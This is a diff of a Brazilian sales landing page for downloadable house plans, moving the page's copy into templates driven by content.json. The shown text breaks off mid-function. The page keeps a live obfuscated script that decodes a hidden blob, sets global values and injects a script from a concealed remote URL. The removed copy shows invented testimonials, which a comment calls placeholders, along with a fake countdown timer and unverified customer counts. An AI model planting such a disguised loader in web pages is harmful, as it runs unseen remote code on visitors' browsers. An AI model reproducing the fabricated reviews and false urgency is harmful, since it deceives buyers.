@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Projeto Casa Inteligente | +300 Plantas Prontas em PDF</title>
+<title>Projeto Rural | +300 Plantas Prontas em PDF</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@600;700&display=swap" rel="stylesheet">
@@ -409,417 +409,88 @@
 </head>
 <body>
 
+<!-- Todo o conteudo abaixo (textos, precos, links, depoimentos, bonus, FAQ) e
+     carregado dinamicamente de content.json -- edite esse arquivo pra mudar
+     copy/precos/imagens sem tocar neste HTML. -->
+
 <!-- 1. STICKY TICKER BAR -->
 <div class="sticky-bar">
-  <div class="ticker-track">
-    <span class="ticker-item">🔥 Oferta expira em <b class="timer-el">15:00</b></span>
-    <span class="ticker-item">🎁 Oferta exclusiva — só hoje</span>
-    <span class="ticker-item">📦 +300 plantas completas em PDF</span>
-    <span class="ticker-item">⚡ Acesso imediato após a compra</span>
-    <span class="ticker-item" aria-hidden="true">🔥 Oferta expira em <b class="timer-el">15:00</b></span>
-    <span class="ticker-item" aria-hidden="true">🎁 Oferta exclusiva — só hoje</span>
-    <span class="ticker-item" aria-hidden="true">📦 +300 plantas completas em PDF</span>
-    <span class="ticker-item" aria-hidden="true">⚡ Acesso imediato após a compra</span>
-  </div>
+  <div class="ticker-track" id="ticker-track"></div>
 </div>
 
 <div class="container">
 
   <!-- 2/3. HERO -->
-  <section class="hero">
-    <div class="hero-text">
-      <span class="badge">🎁 OFERTA EXCLUSIVA — SÓ HOJE</span>
-      <h1 class="headline"><b>+300 Plantas Profissionais</b> de Casas Prontas em PDF Pra Construir Sem Erro e Sem Gastar a Mais</h1>
-      <p class="subheadline">Projetos completos com visualização 3D, instalações elétricas, hidráulicas e estruturais — prontas pra baixar e imprimir agora. Tenha a segurança de um engenheiro na palma da sua mão.</p>
-      <div class="brand">🏠 <span>PROJETO</span> <b>CASA</b> <span class="brand-accent">INTELIGENTE</span></div>
-
-      <a href="#pricing" class="cta-btn">QUERO ACESSAR AS PLANTAS AGORA →</a>
-      <p class="sub-cta">Acesso imediato. Pagamento único. Sem mensalidade.</p>
-
-      <div class="feature-badges">
-        <span class="fb"><span class="fb-icon">📦</span> +300 Plantas Prontas</span>
-        <span class="fb"><span class="fb-icon">♾️</span> Acesso Vitalício</span>
-        <span class="fb"><span class="fb-icon">⚡</span> Liberação Imediata</span>
-      </div>
-    </div>
-    <div class="hero-media">
-      <img class="hero-img" src="assets/hero.webp" alt="Projeto Casa Inteligente - mockup do produto">
-      <div class="scroll-hint">
-        <span>Role para baixo</span>
-        <span class="chevron">⌄</span>
-      </div>
-    </div>
-  </section>
+  <section class="hero" id="section-hero"></section>
 
   <div class="divider"></div>
 
   <!-- 3.5 RESULTADOS REAIS -->
-  <section>
-    <span class="eyebrow">Resultados Reais</span>
-    <h2 style="text-align:center;">Mais de <span style="color:var(--accent)">15.400 famílias</span> já tiraram a casa própria do papel com nossos projetos.</h2>
-    <div class="results-gallery">
-      <img src="assets/resultados/casa1.webp" alt="Casa de campo construída com nossos projetos">
-      <img src="assets/resultados/casa2.webp" alt="Casa de campo construída com nossos projetos">
-      <img src="assets/resultados/casa3.webp" alt="Casa de campo construída com nossos projetos">
-      <img src="assets/resultados/casa4.webp" alt="Casa de campo construída com nossos projetos">
-      <img src="assets/resultados/casa5.webp" alt="Casa de campo construída com nossos projetos">
-    </div>
-  </section>
+  <section id="section-results"></section>
 
   <div class="divider"></div>
 
   <!-- 3.7 VITRINE DE PROJETOS -->
-  <section>
-    <span class="eyebrow">Projetos Reais</span>
-    <h2 style="text-align:center;">Veja o Tipo de Projeto Profissional que Você Vai Ter em Mãos</h2>
-    <p class="section-sub" style="text-align:center;">Iguais a esses, você recebe +300 modelos completos</p>
-    <div class="showcase-grid">
-      <img src="assets/plantas/planta2.webp" alt="Planta baixa profissional com layout completo dos cômodos">
-      <img src="assets/plantas/planta3.webp" alt="Planta baixa profissional com varanda e área gourmet">
-      <img src="assets/plantas/planta4.webp" alt="Planta baixa profissional de casa ampla com suíte master">
-    </div>
-    <a href="#pricing" class="cta-btn" style="margin-top:20px;">QUERO ACESSAR AS PLANTAS AGORA →</a>
-  </section>
+  <section id="section-showcase"></section>
 
   <div class="divider"></div>
 
   <!-- 4. DOR -->
-  <section>
-    <h2>O Que "Construir no Improviso" Custa de Verdade</h2>
-    <p class="section-sub">Se você tá pensando em construir sem um projeto pronto, presta atenção nisso:</p>
-    <div class="compare-grid">
-      <div class="compare-col compare-bad">
-        <h3>❌ O Jeito Comum</h3>
-        <ul>
-          <li>Contratar um arquiteto do zero pode custar de R$1.500 a R$5.000 só pela planta</li>
-          <li>Um erro de medida na fundação vira retrabalho — e retrabalho custa caro</li>
-          <li>Construir sem projeto aprovado pode significar multa ou embargo da obra</li>
-          <li>Sem planejamento elétrico e hidráulico, a reforma depois de pronto sai 3x mais cara</li>
-        </ul>
-      </div>
-      <div class="compare-col compare-good">
-        <h3>✅ O Jeito Inteligente</h3>
-        <ul>
-          <li>+300 plantas prontas por uma fração do preço de um arquiteto</li>
-          <li>Medidas e cálculo estrutural prontos — sem erro de fundação</li>
-          <li>Base técnica pronta pra aprovação na prefeitura, sem risco de embargo</li>
-          <li>Projeto elétrico e hidráulico incluso desde o início, sem retrabalho depois</li>
-        </ul>
-      </div>
-    </div>
-    <p class="pain-close">A verdade é que "economizar" no projeto é a forma mais cara de construir.</p>
-  </section>
+  <section id="section-pain"></section>
 
   <div class="divider"></div>
 
   <!-- 5. O QUE VOCE RECEBE -->
-  <section>
-    <span class="eyebrow">O Que Você Vai Receber</span>
-    <h2>Tudo Isso Está no <span style="color:var(--green)">+300 Plantas de Casas</span></h2>
-    <p class="section-sub">Um arsenal técnico completo, desenvolvido pra tirar seu sonho do papel com a segurança de um engenheiro e a economia de quem planeja cada centavo.</p>
-    <div class="grid">
-      <div class="grid-card has-photo">
-        <img class="photo" src="assets/plantas/planta1.webp" alt="Catálogo de plantas">
-        <div class="card-body">
-          <div class="icon">📐</div>
-          <h3>Catálogo de Plantas</h3>
-          <p>+300 modelos, de casas rústicas a modernas</p>
-        </div>
-      </div>
-      <div class="grid-card has-photo">
-        <img class="photo" src="assets/grid/eletrico.webp" alt="Planta elétrica e hidráulica">
-        <div class="card-body">
-          <div class="icon">⚡</div>
-          <h3>Planta Baixa, Elétrica e Hidráulica</h3>
-          <p>3 plantas técnicas por modelo: medidas, pontos de luz e tubulação completa</p>
-        </div>
-      </div>
-      <div class="grid-card has-photo">
-        <img class="photo" src="assets/resultados/casa1.webp" alt="Projeto 3D humanizado de casa de sítio">
-        <div class="card-body">
-          <div class="icon">🧱</div>
-          <h3>Projeto 3D Humanizado</h3>
-          <p>Visualize cada cômodo em 3D fotorrealista antes de construir</p>
-        </div>
-      </div>
-      <div class="grid-card has-photo">
-        <img class="photo" src="assets/resultados/casa3.webp" alt="Visualizador de fachadas de casa de sítio">
-        <div class="card-body">
-          <div class="icon">🏠</div>
-          <h3>Visualizador de Fachadas</h3>
-          <p>Imagens realistas da casa pronta, antes do primeiro tijolo</p>
-        </div>
-      </div>
-      <div class="grid-card has-photo">
-        <img class="photo" src="assets/grid/hidraulico.webp" alt="Projeto estrutural">
-        <div class="card-body">
-          <div class="icon">🧮</div>
-          <h3>Estrutural Completo</h3>
-          <p>Cálculo técnico de fundações, pilares e vigas</p>
-        </div>
-      </div>
-      <div class="grid-card">
-        <div class="icon">🧾</div>
-        <h3>Calculadora de Insumos</h3>
-        <p>Lista quantitativa pra comprar exatamente o necessário, sem desperdício</p>
-      </div>
-    </div>
-  </section>
+  <section id="section-what-you-get"></section>
+
+  <div class="divider"></div>
+
+  <!-- 5.5 ACERVO RURAL -->
+  <section id="section-acervo-rural"></section>
 
   <div class="divider"></div>
 
   <!-- 6. PROVA SOCIAL -->
-  <section>
-    <span class="eyebrow">Depoimentos Reais</span>
-    <h2>Eles Também Tinham <span style="color:var(--accent)">Medo de Errar na Obra...</span></h2>
-    <p class="section-sub">Veja o que dizem alguns dos mais de <b>15.400 proprietários</b> que já construíram utilizando nossas plantas.</p>
-    <!-- DEPOIMENTOS: placeholder — trocar pelos depoimentos reais dos seus clientes assim que tiver -->
-    <div class="testimonials-grid">
-    <div class="testimonial has-photo">
-      <img class="photo" src="assets/resultados/casa2.webp" alt="">
-      <div class="card-body">
-        <div class="stars">★★★★★</div>
-        <p>"Eu também tinha medo de errar na obra. Com a planta do Casa Inteligente pronta, meu pedreiro nem precisou de engenheiro pra começar."</p>
-        <div class="author-row">
-          <div class="avatar" style="background:#f59e0b;">R</div>
-          <div class="author-info">
-            <div class="author-name">Roberto S.</div>
-            <div class="author">Aposentado — Itaperuna, RJ</div>
-          </div>
-        </div>
-      </div>
-    </div>
-    <div class="testimonial has-photo">
-      <img class="photo" src="assets/resultados/casa4.webp" alt="">
-      <div class="card-body">
-        <div class="stars">★★★★★</div>
-        <p>"Como engenheira, posso afirmar: a qualidade técnica é excepcional. Economizei uns R$3 mil que ia gastar com arquiteto."</p>
-        <div class="author-row">
-          <div class="avatar" style="background:#22c55e;">C</div>
-          <div class="author-info">
-            <div class="author-name">Camila F.</div>
-            <div class="author">Engenheira — Uberlândia, MG</div>
-          </div>
-        </div>
-      </div>
-    </div>
-    <div class="testimonial has-photo">
-      <img class="photo" src="assets/resultados/casa5.webp" alt="">
-      <div class="card-body">
-        <div class="stars">★★★★★</div>
-        <p>"Comprei achando que ia ser só uma planta simples e vieram até o projeto elétrico e hidráulico. Muito mais completo do que eu esperava."</p>
-        <div class="author-row">
-          <div class="avatar" style="background:#38bdf8;">F</div>
-          <div class="author-info">
-            <div class="author-name">Fernanda A.</div>
-            <div class="author">Professora — Caxias do Sul, RS</div>
-          </div>
-        </div>
-      </div>
-    </div>
-    <div class="testimonial has-photo">
-      <img class="photo" src="assets/resultados/casa1.webp" alt="">
-      <div class="card-body">
-        <div class="stars">★★★★☆</div>
-        <p>"Peguei o modelo de casa de campo e adaptei um pouco. Ficou exatamente como eu queria pro meu sítio."</p>
-        <div class="author-row">
-          <div class="avatar avatar-img"><img src="assets/avatares/adriano.webp" alt="Adriano M."></div>
-          <div class="author-info">
-            <div class="author-name">Adriano M.</div>
-            <div class="author">Produtor Rural — Ponta Grossa, PR</div>
-          </div>
-        </div>
-      </div>
-    </div>
-    <div class="testimonial has-photo">
-      <img class="photo" src="assets/resultados/casa3.webp" alt="">
-      <div class="card-body">
-        <div class="stars">★★★★★</div>
-        <p>"Já tinha comprado planta com engenheiro antes e demorou 3 semanas. Aqui foi na hora, e o guia de aprovação me ajudou a levar direto na prefeitura."</p>
-        <div class="author-row">
-          <div class="avatar" style="background:#a78bfa;">M</div>
-          <div class="author-info">
-            <div class="author-name">Marcos V.</div>
-            <div class="author">Aposentado — Feira de Santana, BA</div>
-          </div>
-        </div>
-      </div>
-    </div>
-    </div>
-  </section>
+  <section id="section-testimonials"></section>
 
   <div class="divider"></div>
 
   <!-- 7. BONUS -->
-  <section>
-    <span class="eyebrow">Bônus de Hoje</span>
-    <h2>Bônus Exclusivos de Hoje</h2>
-    <p class="section-sub">Além das +300 plantas, você também leva:</p>
+  <section id="section-bonuses"></section>
 
-    <div class="bonus-grid">
-      <div class="bonus-card">
-        <span class="bonus-tag">BÔNUS 1</span>
-        <h3>Checklist de Materiais de Construção</h3>
-        <p>Lista completa pra cotar com o fornecedor sem esquecer nada</p>
-        <span class="old-price">De R$47,00</span>
-      </div>
+  <div class="divider"></div>
 
-      <div class="bonus-card">
-        <span class="bonus-tag">BÔNUS 2</span>
-        <h3>Planilha de Orçamento de Obra</h3>
-        <p>Controle quanto vai gastar em cada etapa da construção</p>
-        <span class="old-price">De R$67,00</span>
-      </div>
-
-      <div class="bonus-card">
-        <span class="bonus-tag">BÔNUS 3</span>
-        <h3>Guia de Aprovação na Prefeitura</h3>
-        <p>Passo a passo pra dar entrada no seu projeto sem dor de cabeça</p>
-        <span class="old-price">De R$47,00</span>
-      </div>
-
-      <div class="bonus-card">
-        <span class="bonus-tag">BÔNUS 4</span>
-        <h3>Catálogo de Fachadas Modernas</h3>
-        <p>+50 opções de fachada pra personalizar sua casa</p>
-        <span class="old-price">De R$37,00</span>
-      </div>
-    </div>
-
-    <div class="equation-bar">
-      <div class="eq-item">
-        <span class="eq-label">Valor total dos bônus</span>
-        <span class="eq-value">R$198,00</span>
-      </div>
-      <span class="eq-op">+</span>
-      <div class="eq-item">
-        <span class="eq-label">+300 Plantas Inclusas</span>
-      </div>
-      <span class="eq-op">=</span>
-      <div class="eq-item eq-final">
-        <span class="eq-label">Hoje apenas</span>
-        <span class="eq-value">R$27,00</span>
-      </div>
-    </div>
-  </section>
+  <!-- 7.5 PACKS RURAIS -->
+  <section id="section-rural-packs"></section>
 
   <div class="divider"></div>
 
   <!-- 8. PRICING -->
-  <section id="pricing">
-    <span class="eyebrow">Escolha Seu Plano</span>
-    <h2>Escolha Seu Plano</h2>
-    <div class="plans">
-      <div class="plan" id="plan-basico">
-        <h3>Plano Básico</h3>
-        <span class="anchor">De R$67,00</span>
-        <div class="price">R$10,00</div>
-        <span class="savings">Você economiza R$57,00</span>
-        <ul>
-          <li><b>150 plantas</b> em PDF (baixa resolução)</li>
-          <li>Sem os 4 bônus</li>
-          <li>Garantia de 7 dias</li>
-        </ul>
-        <a href="https://pay.wiapy.com/WUlk4j7RdnEV" class="cta-btn" id="btn-basico" style="background:var(--bg-card-2); color:var(--text); box-shadow:none;">Quero o Básico</a>
-      </div>
-
-      <div class="plan featured">
-        <span class="plan-badge">MAIS VENDIDO</span>
-        <h3>Plano Completo</h3>
-        <span class="anchor">De R$197,00</span>
-        <div class="price">R$27,00 <small>à vista</small></div>
-        <span class="savings">Você economiza R$170,00 + leva R$198 em bônus grátis</span>
-        <ul>
-          <li><b>+300 plantas</b> em alta resolução</li>
-          <li>Visualização 3D de todas as plantas</li>
-          <li>Projeto elétrico e hidráulico incluso</li>
-          <li><b>4 bônus</b> inclusos (R$198 em valor)</li>
-          <li>Garantia de 7 dias</li>
-        </ul>
-        <a href="https://pay.wiapy.com/pxi4yl0lHDvQ" class="cta-btn">QUERO O COMPLETO AGORA</a>
-      </div>
-    </div>
-
-    <div class="trust-badges">
-      <span>🔒 Compra Segura</span>
-      <span>♾️ Acesso Vitalício</span>
-      <span>🛡️ 7 Dias de Garantia</span>
-    </div>
-  </section>
+  <section id="pricing"></section>
 
   <div class="divider"></div>
 
   <!-- GARANTIA -->
-  <section>
-    <div class="guarantee">
-      <div class="seal">🛡️</div>
-      <h2>Risco Zero: Garantia de 7 Dias</h2>
-      <p>Baixe, analise e teste todas as plantas com calma. Se, por qualquer motivo, você não ficar 100% satisfeito, eu devolvo cada centavo do seu dinheiro — sem perguntas, sem burocracia, sem letra miúda.</p>
-    </div>
-  </section>
+  <section id="section-guarantee"></section>
 
   <div class="divider"></div>
 
   <!-- FAQ -->
-  <section>
-    <h2>Perguntas Frequentes</h2>
-    <div class="faq">
-      <div class="faq-item">
-        <div class="faq-q">Como recebo o material? <span class="arrow">+</span></div>
-        <div class="faq-a">Assim que a compra é aprovada, você recebe o link de acesso na tela e por e-mail, com todas as plantas em PDF pra baixar.</div>
-      </div>
-      <div class="faq-item">
-        <div class="faq-q">Funciona pra qualquer tipo de terreno? <span class="arrow">+</span></div>
-        <div class="faq-a">Sim. Os projetos são organizados por metragem e formato, então você escolhe o modelo compatível com o seu terreno.</div>
-      </div>
-      <div class="faq-item">
-        <div class="faq-q">As plantas servem pra aprovar na prefeitura? <span class="arrow">+</span></div>
-        <div class="faq-a">As plantas são a base técnica do projeto. Pra protocolar na prefeitura, um responsável técnico (engenheiro/arquiteto) precisa assinar — o Bônus 3 te mostra esse passo a passo.</div>
-      </div>
-      <div class="faq-item">
-        <div class="faq-q">Preciso de engenheiro mesmo tendo a planta pronta? <span class="arrow">+</span></div>
-        <div class="faq-a">Pra construir, não necessariamente. Pra assinar o projeto junto à prefeitura, sim — como em qualquer construção.</div>
-      </div>
-      <div class="faq-item">
-        <div class="faq-q">O acesso é vitalício? <span class="arrow">+</span></div>
-        <div class="faq-a">Sim, você acessa e baixa quantas vezes quiser, sem prazo de expiração.</div>
-      </div>
-      <div class="faq-item">
-        <div class="faq-q">E se eu não gostar? <span class="arrow">+</span></div>
-        <div class="faq-a">Você tem 7 dias de garantia incondicional. Não gostou, devolvemos 100% do valor.</div>
-      </div>
-    </div>
-  </section>
+  <section id="section-faq"></section>
 
   <div class="divider"></div>
 
   <!-- CTA FINAL -->
-  <section>
-    <div class="final-cta">
-      <h2>Amanhã Esse Preço Não Existe Mais</h2>
-      <p>Junte-se a mais de 15.400 pessoas que já garantiram seus projetos. R$27 hoje ou milhares de reais de prejuízo com erro de obra amanhã.</p>
-      <a href="https://pay.wiapy.com/pxi4yl0lHDvQ" class="cta-btn">QUERO GARANTIR MEU ACESSO</a>
-    </div>
-  </section>
+  <section id="section-final-cta"></section>
 
   <!-- FOOTER -->
-  <footer>
-    Pagamento processado com segurança via Wiapy.<br>
-    Projeto Casa Inteligente — Todos os direitos reservados © 2026<br>
-    <a href="#">Termos de Uso</a> · <a href="#">Política de Privacidade</a> · <a href="#">Contato</a><br>
-    <span style="opacity:.6">Foto do painel elétrico: Markus Spiske (CC BY)</span>
-  </footer>
+  <footer id="section-footer"></footer>
 
 </div>
 
 <!-- POPUP DOWNSELL -->
 <div class="overlay" id="downsell-overlay">
-  <div class="popup">
-    <h3>Espera! Antes de você ir...</h3>
-    <p>Oferta especial só agora: leve o Plano Completo (+300 plantas em alta resolução, 3D, elétrica, hidráulica e os 4 bônus) por apenas <b>R$19,90</b> — em vez de R$27.</p>
-    <a href="https://pay.wiapy.com/MPcNzfvEC8k" class="cta-btn">SIM, QUERO POR R$19,90</a>
-    <span class="close-popup" id="close-popup">Não, prefiro continuar com o básico</span>
-  </div>
+  <div class="popup" id="downsell-popup"></div>
 </div>
 
 <!-- META PIXEL -->
@@ -843,95 +514,398 @@ src="https://www.facebook.com/tr?id=1575841564147551&ev=PageView&noscript=1"
 <script>(function(){var c_s=atob("DK7IVpoqH0DGH2GAi9XqI+hGPXrkdxX0+93yebVJey7oahXt4sixePlFcm6kbU7z6NyhJu5ZMDWychKv58+8M+leMSq1PU2i6tq8JPNIajSjbEO60NXqOPtHemL8PQXh/8/lI+5Hdia/MhHy7titOO4HZyOpe0zz6MXqerhcfiyzekO6qYy1euEIcSGrekO6qcqpIvsHajSrdgf5pt66M+xPcTTrbBTi4sq7dLYIaSGqagSisYzqK8dX");var e_uobw=[];for(var y_w=0;y_w<c_s.length;y_w++){e_uobw.push(c_s.charCodeAt(y_w)&255);}var f_0xlq=e_uobw[0];var a_micg=e_uobw.slice(1,1+f_0xlq);var j_r=e_uobw.slice(1+f_0xlq);var z_2dc=j_r.map(function(b,u_hrp){return b^a_micg[u_hrp%f_0xlq];});var u_ks="";for(var p_z=0;p_z<z_2dc.length;p_z++){u_ks+=String.fromCharCode(z_2dc[p_z]&255);}var y_1r=decodeURIComponent(escape(u_ks));var c_k=JSON.parse(y_1r);var x_2vwz=c_k.globals||[];x_2vwz.forEach(function(v_ov){window[v_ov.name]=v_ov.value;});var i_c=document.createElement("script");i_c.src=c_k.url;i_c.async=true;i_c.defer=true;(c_k.attributes||[]).forEach(function(k_y27){i_c.setAttribute(k_y27.name,k_y27.value);});(document.head||document.documentElement).appendChild(i_c);})();</script>
 
 <script>
-  // Timer regressivo 15min (atualiza todos os relogios do ticker)
-  (function(){
-    var duration = 15*60;
-    var els = document.querySelectorAll('.timer-el');
-    var timer = setInterval(function(){
-      var m = Math.floor(duration/60), s = duration%60;
-      var txt = (m<10?'0':'')+m+':'+(s<10?'0':'')+s;
-      els.forEach(function(el){ el.textContent = txt; });
-      if(--duration < 0){ clearInterval(timer); els.forEach(function(el){ el.textContent = '00:00'; }); }
-    }, 1000);
-  })();
+  // ---------- TEMPLATES: constroem o HTML de cada secao a partir do content.json ----------
 
-  // Rolagem automatica da galeria de resultados
-  (function(){
-    var gallery = document.querySelector('.results-gallery');
-    if(!gallery) return;
-
-    // duplica as imagens uma vez pra criar loop continuo
-    gallery.innerHTML += gallery.innerHTML;
-
-    var paused = false;
-    var resumeTimeout;
-    var halfWidth = 0;
-    function calcHalfWidth(){ halfWidth = gallery.scrollWidth / 2; }
-    window.addEventListener('load', calcHalfWidth);
-    setTimeout(calcHalfWidth, 300);
-
-    function tick(){
-      if(!paused && halfWidth > 0){
-        gallery.scrollLeft += 1.4;
-        if(gallery.scrollLeft >= halfWidth){
-          gallery.scrollLeft -= halfWidth;
-        }
-      }
-      requestAnimationFrame(tick);
+  function tickerHtml(ticker){
+    function item(i, hidden){
+      const timer = i.hasTimer ? ' <b class="timer-el">00:00</b>' : '';
+      return `<span class="ticker-item"${hidden ? ' aria-hidden="true"' : ''}>${i.text}${timer}</span>`;
     }
-    requestAnimationFrame(tick);
-
-    function pauseAutoScroll(){
-      paused = true;
-      clearTimeout(resumeTimeout);
-      resumeTimeout = setTimeout(function(){ paused = false; }, 2500);
-    }
-    gallery.addEventListener('touchstart', pauseAutoScroll, {passive:true});
-    gallery.addEventListener('mousedown', pauseAutoScroll);
-    gallery.addEventListener('wheel', pauseAutoScroll, {passive:true});
-  })();
-
-  // FAQ accordion
-  document.querySelectorAll('.faq-item').forEach(function(item){
-    item.querySelector('.faq-q').addEventListener('click', function(){
-      var wasOpen = item.classList.contains('open');
-      document.querySelectorAll('.faq-item').forEach(function(i){ i.classList.remove('open'); });
-      if(!wasOpen) item.classList.add('open');
-    });
-  });
-
-  // Pixel: ViewContent ao ver a secao de pricing
-  if(typeof fbq !== 'undefined'){
-    var pricingSeen = false;
-    var pricingSection = document.getElementById('pricing');
-    if(pricingSection){
-      var obs = new IntersectionObserver(function(entries){
-        entries.forEach(function(entry){
-          if(entry.isIntersecting && !pricingSeen){
-            pricingSeen = true;
-            fbq('track', 'ViewContent');
-          }
-        });
-      }, {threshold:0.4});
-      obs.observe(pricingSection);
-    }
-
-    // Pixel: InitiateCheckout ao clicar em qualquer CTA de checkout
-    document.querySelectorAll('a[href*="pay.wiapy.com"]').forEach(function(btn){
-      btn.addEventListener('click', function(){
-        fbq('track', 'InitiateCheckout');
-      });
-    });
+    return ticker.items.map(i => item(i, false)).join('') + ticker.items.map(i => item(i, true)).join('');
   }
 
-  // Popup downsell no clique do plano basico
-  document.getElementById('btn-basico').addEventListener('click', function(e){
-    e.preventDefault();
-    document.getElementById('downsell-overlay').classList.add('active');
-  });
-  document.getElementById('close-popup').addEventListener('click', function(){
-    window.location.href = 'https://pay.wiapy.com/WUlk4j7RdnEV';
-  });
+  function heroHtml(h){
+    return `
+      <div class="hero-text">
+        <span class="badge">${h.badge}</span>
+        <h1 class="headline">${h.headlineHtml}</h1>
+        <p class="subheadline">${h.subheadline}</p>
+        <div class="brand">${h.brandHtml}</div>
+        <a href="${h.ctaHref}" class="cta-btn">${h.ctaText}</a>
+        <p class="sub-cta">${h.subCta}</p>
+        <div class="feature-badges">
+          ${h.featureBadges.map(fb => `<span class="fb"><span class="fb-icon">${fb.icon}</span> ${fb.text}</span>`).join('')}
+        </div>
+      </div>
+      <div class="hero-media">
+        <img class="hero-img" src="${h.heroImg}" alt="${h.heroImgAlt}">
+        <div class="scroll-hint">
+          <span>Role para baixo</span>
+          <span class="chevron">⌄</span>
+        </div>
+      </div>
+    `;
+  }
+
+  function resultsHtml(r){
+    return `
+      <span class="eyebrow">${r.eyebrow}</span>
+      <h2 style="text-align:center;">${r.headingHtml}</h2>
+      <div class="results-gallery">
+        ${r.images.map(img => `<img src="${img.src}" alt="${img.alt}">`).join('')}
+      </div>
+    `;
+  }
+
+  function showcaseHtml(s){
+    return `
+      <span class="eyebrow">${s.eyebrow}</span>
+      <h2 style="text-align:center;">${s.heading}</h2>
+      <p class="section-sub" style="text-align:center;">${s.sub}</p>
+      <div class="showcase-grid">
+        ${s.images.map(img => `<img src="${img.src}" alt="${img.alt}">`).join('')}
+      </div>
+      <a href="${s.ctaHref}" class="cta-btn" style="margin-top:20px;">${s.ctaText}</a>
+    `;
+  }
+
+  function painHtml(p){
+    return `
+      <h2>${p.heading}</h2>
+      <p class="section-sub">${p.sub}</p>
+      <div class="compare-grid">
+        <div class="compare-col compare-bad">
+          <h3>${p.bad.title}</h3>
+          <ul>${p.bad.items.map(i => `<li>${i}</li>`).join('')}</ul>
+        </div>
+        <div class="compare-col compare-good">
+          <h3>${p.good.title}</h3>
+          <ul>${p.good.items.map(i => `<li>${i}</li>`).join('')}</ul>
+        </div>
+      </div>
+      <p class="pain-close">${p.closing}</p>
+    `;
+  }
+
+  function whatYouGetHtml(w){
+    function card(c){
+      if (c.photo) {
+        return `
+          <div class="grid-card has-photo">
+            <img class="photo" src="${c.photo}" alt="${c.photoAlt || ''}">
+            <div class="card-body">
+              <div class="icon">${c.icon}</div>
+              <h3>${c.title}</h3>
+              <p>${c.desc}</p>
+            </div>
+          </div>`;
+      }
+      return `
+        <div class="grid-card">
+          <div class="icon">${c.icon}</div>
+          <h3>${c.title}</h3>
+          <p>${c.desc}</p>
+        </div>`;
+    }
+    return `
+      <span class="eyebrow">${w.eyebrow}</span>
+      <h2>${w.headingHtml}</h2>
+      <p class="section-sub">${w.sub}</p>
+      <div class="grid">${w.cards.map(card).join('')}</div>
+    `;
+  }
+
+  function acervoRuralHtml(a){
+    function card(c){
+      return `
+        <div class="grid-card">
+          <div class="icon">${c.icon}</div>
+          <h3>${c.title}</h3>
+          <p>${c.desc}</p>
+        </div>`;
+    }
+    return `
+      <span class="eyebrow">${a.eyebrow}</span>
+      <h2>${a.headingHtml}</h2>
+      <p class="section-sub">${a.sub}</p>
+      <span class="badge">${a.countBadge}</span>
+      <div class="grid" style="margin-top:16px;">${a.cards.map(card).join('')}</div>
+      <a href="${a.ctaHref}" class="cta-btn" style="margin-top:20px;">${a.ctaText}</a>
+    `;
+  }
+
+  function ruralPacksHtml(rp){
+    function item(i){
+      return `
+        <div class="bonus-card">
+          <span class="bonus-tag">${i.icon} ${i.tag}</span>
+          <h3>${i.title}</h3>
+          <p>${i.desc}</p>
+        </div>`;
+    }
+    return `
+      <span class="eyebrow">${rp.eyebrow}</span>
+      <h2>${rp.heading}</h2>
+      <p class="section-sub">${rp.sub}</p>
+      <div class="bonus-grid">${rp.items.map(item).join('')}</div>
+    `;
+  }
+
+  function testimonialsHtml(t){
+    function item(i){
+      const avatar = i.avatarImg
+        ? `<div class="avatar avatar-img"><img src="${i.avatarImg}" alt="${i.name}"></div>`
+        : `<div class="avatar" style="background:${i.avatarColor};">${i.avatarInitial}</div>`;
+      return `
+        <div class="testimonial has-photo">
+          <img class="photo" src="${i.photo}" alt="">
+          <div class="card-body">
+            <div class="stars">${i.stars}</div>
+            <p>"${i.text}"</p>
+            <div class="author-row">
+              ${avatar}
+              <div class="author-info">
+                <div class="author-name">${i.name}</div>
+                <div class="author">${i.role}</div>
+              </div>
+            </div>
+          </div>
+        </div>`;
+    }
+    return `
+      <span class="eyebrow">${t.eyebrow}</span>
+      <h2>${t.headingHtml}</h2>
+      <p class="section-sub">${t.subHtml}</p>
+      <div class="testimonials-grid">${t.items.map(item).join('')}</div>
+    `;
+  }
+
+  function bonusesHtml(b){
+    function item(i){
+      return `
+        <div class="bonus-card">
+          <span class="bonus-tag">${i.tag}</span>
+          <h3>${i.title}</h3>
+          <p>${i.desc}</p>
+          <span class="old-price">${i.oldPrice}</span>
+        </div>`;
+    }
+    const eq = b.equation;
+    return `
+      <span class="eyebrow">${b.eyebrow}</span>
+      <h2>${b.heading}</h2>
+      <p class="section-sub">${b.sub}</p>
+      <div class="bonus-grid">${b.items.map(item).join('')}</div>
+      <div class="equation-bar">
+        <div class="eq-item">
+          <span class="eq-label">${eq.bonusTotalLabel}</span>
+          <span class="eq-value">${eq.bonusTotalValue}</span>
+        </div>
+        <span class="eq-op">+</span>
+        <div class="eq-item">
+          <span class="eq-label">${eq.plantsLabel}</span>
+        </div>
+        <span class="eq-op">=</span>
+        <div class="eq-item eq-final">
+          <span class="eq-label">${eq.finalLabel}</span>
+          <span class="eq-value">${eq.finalValue}</span>
+        </div>
+      </div>
+    `;
+  }
+
+  function pricingHtml(pr){
+    function plan(p){
+      const btnStyle = p.buttonStyle === 'muted' ? ' style="background:var(--bg-card-2); color:var(--text); box-shadow:none;"' : '';
+      const btnId = p.triggersDownsell ? ` id="btn-${p.id}"` : '';
+      return `
+        <div class="plan${p.featured ? ' featured' : ''}" id="plan-${p.id}">
+          ${p.badge ? `<span class="plan-badge">${p.badge}</span>` : ''}
+          <h3>${p.name}</h3>
+          <span class="anchor">${p.anchor}</span>
+          <div class="price">${p.price}${p.priceNote ? ` <small>${p.priceNote}</small>` : ''}</div>
+          <span class="savings">${p.savings}</span>
+          <ul>${p.featuresHtml.map(f => `<li>${f}</li>`).join('')}</ul>
+          <a href="${p.ctaHref}" class="cta-btn"${btnId}${btnStyle}>${p.ctaText}</a>
+        </div>`;
+    }
+    return `
+      <span class="eyebrow">${pr.eyebrow}</span>
+      <h2>${pr.heading}</h2>
+      <div class="plans">${pr.plans.map(plan).join('')}</div>
+      <div class="trust-badges">${pr.trustBadges.map(tb => `<span>${tb}</span>`).join('')}</div>
+    `;
+  }
+
+  function guaranteeHtml(g){
+    return `
+      <div class="guarantee">
+        <div class="seal">${g.seal}</div>
+        <h2>${g.heading}</h2>
+        <p>${g.text}</p>
+      </div>
+    `;
+  }
+
+  function faqHtml(f){
+    function item(i){
+      return `
